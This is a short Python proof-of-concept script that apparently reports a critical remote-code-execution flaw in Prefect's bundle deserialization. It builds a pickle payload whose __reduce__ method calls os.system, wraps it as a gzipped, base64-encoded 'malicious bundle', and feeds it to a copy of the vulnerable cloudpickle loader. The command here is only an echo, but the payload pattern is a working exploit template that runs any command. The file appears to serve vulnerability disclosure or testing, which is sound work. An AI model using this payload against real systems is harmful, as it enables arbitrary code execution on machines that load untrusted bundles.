"""
PoC: CRITICAL - Remote Code Execution via Cloudpickle Bundle Deserialization
Location: src/prefect/bundles/__init__.py:141
Function: _deserialize_bundle_object
"""
import base64
import gzip
import cloudpickle
import os


class EvilPayload:
    """Pickle payload that executes arbitrary command on deserialization."""
    def __reduce__(self):
        return (os.system, ("echo BUNDLE_RCE_CONFIRMED",))


def _deserialize_bundle_object(serialized_obj: str):
    """Vulnerable function from src/prefect/bundles/__init__.py:141"""
    return cloudpickle.loads(gzip.decompress(base64.b64decode(serialized_obj)))


if __name__ == "__main__":
    # Simulate a malicious bundle's "function" field
    serialized = base64.b64encode(
        gzip.compress(cloudpickle.dumps(EvilPayload()))
    ).decode()

    print("[*] Deserializing malicious bundle payload...")
    result = _deserialize_bundle_object(serialized)
    print(f"[*] Deserialization returned: {result}")
    print("[*] If 'BUNDLE_RCE_CONFIRMED' was printed above, RCE is confirmed.")
